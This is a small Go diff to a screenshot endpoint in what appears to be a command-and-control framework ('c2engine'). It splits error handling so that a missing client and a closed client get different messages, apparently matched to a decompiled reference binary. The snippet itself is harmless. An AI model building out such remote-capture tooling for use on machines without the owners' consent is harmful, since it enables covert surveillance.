@@ -38,7 +38,12 @@ func (c *ScreenshotController) Get() {
 	}
 
 	client := c2engine.GetEngine().GetClient(id)
-	if client == nil || !client.Status {
+	if client == nil {
+		// 黑盒：不存在的客户端 → "connection error"（FUN_01919c00 文案）。
+		c.JsonErr("connection error")
+		return
+	}
+	if !client.Status {
 		c.JsonErr("client is close")
 		return
 	}
